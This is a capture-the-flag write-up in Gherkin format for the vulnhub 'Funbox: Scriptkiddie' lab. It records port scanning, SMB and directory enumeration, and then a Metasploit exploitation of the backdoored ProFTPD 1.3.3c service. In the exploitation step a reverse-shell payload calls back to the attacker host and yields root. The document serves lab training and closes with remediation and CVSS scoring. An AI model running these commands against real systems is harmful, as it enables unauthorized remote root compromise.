## Version 1.4.1
## language: en

Feature:
  TOE:
    vulnhub Funbox: Scriptkiddie
  Location:
    192.168.1.108:21
  CWE:
    CWE-77: https://cwe.mitre.org/data/definitions/77.html
  Rule:
    REQ.004: https://docs.fluidattacks.com/criteria/vulnerabilities/004
    REQ.014: https://docs.fluidattacks.com/criteria/vulnerabilities/014
    REQ.061: https://docs.fluidattacks.com/criteria/vulnerabilities/061/
  Goal:
    Get root privileges
  Recommendation:
    Upgrade services such as FTP

  Background:

  Hacker's software:
    | <Software name> | <Version>    |
    | Kali linux      | 5.10.28      |
    | Virtualbox      | 6.1.34       |
    | Firefox         | 91.9.0       |
    | Nmap            | 7.92         |
    | Gobuster        | 3.1.0        |
    | arp-scan        | 1.9.7        |
    | smbmap          | 1.0.5        |
    | msfconsole      | 6.2.3-dev    |
  TOE information:
    Given a .ova file
    Then I ran the file in Virtualbox
    Then I could see the virtual machine was running [evidence](01.png)
    And the server is running FTP version ProFTPD 1.3.3c
    And SSH version OpenSSH 7.2p2
    And SMTP version Postfix smtpd
    And HTTP version Apache httpd 2.4.18
    And POP3 version Dovecot pop3d
    And SAMBA version smbd 3.X - 4.X and smbd 4.3.11-Ubuntu
    And IMAP version Dovecot imapd

  Scenario: Normal use case
    Given access to a virtual server
    Then I execute the following commands:
    """
    $ nmap -sP 192.168.1.0/24
    $ sudo arp-scan -l
    """
    When looking at the result [evidence](02.png)
    Then I decided to visit the site:
    """
    http://192.168.1.108/
    """
    When looking in the browser
    Then I saw just an error on the web page [evidence](03.png)

  Scenario: Dynamic detection
    Given an IPv4 address 192.168.1.108
    Then I ran a scan report
    And I execute the following command:
    """
    $ nmap -p- -sV -sC 192.168.1.108
    """
    Then I could see services and which ports are open [evidence](04.png)
    And I decided to explore the different ports
    Then I noted that port 21 was used by FTP
    And its version ProFTPD 1.3.3c
    When looking for a ProFTPD 1.3.3c vulnerability
    Then I found the following article [evidence](05.png)
    """
    https://www.exploit-db.com/exploits/16921
    """
    When I checked it was something interesting
    Then I noted that port 22 was used by SSH
    And its version OpenSSH 7.2p2
    Then I noted that port 25 was used by SMTP
    And its version Postfix smtpd
    Then I noted that port 80 was used by HTTP
    And its version Apache httpd 2.4.18
    When looking in the browser, I see a web page
    And there was just an error on the web page
    Then I noted that port 110 was used by POP3
    And its version Dovecot pop3d
    Then I noted that port 139 was used by SAMBA
    And its version smbd 3.X - 4.X
    When looking for a SAMBA vulnerability
    Then I execute the following command: [evidence](06.png)
    """
    $ smbclient -L 192.168.1.108
    """
    Then I execute one more command: [evidence](07.png)
    """
    $ smbmap -H 192.168.1.108
    """
    When I checked it
    Then I noted that there was no access using SAMBA
    Then I noted that port 143 was used by IMAP
    And its version Dovecot imapd
    Then I noted that port 445 was used by SAMBA
    And its version smbd 4.3.11-Ubuntu
    Then I decided to search possible hidden directories with gobuster
    And I execute the following command:
    """
    $ gobuster dir -u http://192.168.1.108
    -w /usr/share/wordlist/dirb/common.txt
    """
    Then I got the next result [evidence](08.png)
    When I checked it was not something interesting
    Then I could conclude that I can only use msfconsole
    And exploit the ProFTPD 1.3.3c vulnerability

  Scenario: Exploitation
    Given the FTP service 192.168.1.108:21
    And the ProFTPD 1.3.3c vulnerability
    Then I could execute a backdoor command execution using msfconsole
    Then I run the following commands: [evidence](09.png)
    """
    $ msfconsole
    > search proftpd_133c_backdoor
    > use exploit/unix/ftp/proftpd_133c_backdoor
    > set RHOSTS 192.168.1.108
    > set payload payload/cmd/unix/reverse
    > set LHOST 192.168.1.106
    > exploit
    """
    When I got a positive response [evidence](10.png)
    Then I become the root user [evidence](11.png)
    And I got the flag [evidence](12.png)

  Scenario: Remediation
    Given that the system has a vulnerability
    Then is necessary to upgrade the FTP service
    Then I can confirm that the server is less vulnerable

  Scenario: Scoring
  Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    7.5/10 (High) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/
  Temporal: Attributes that measure the exploit's popularity and fixability
    7.0/10 (High) - E:F/RL:O/RC:C
  Environmental: Unique and relevant attributes to a specific user environment
    7.0/10 (High) - CR:M/IR:M/AR:M

  Scenario: Correlations
    No correlations have been found to this date 2022-07-06
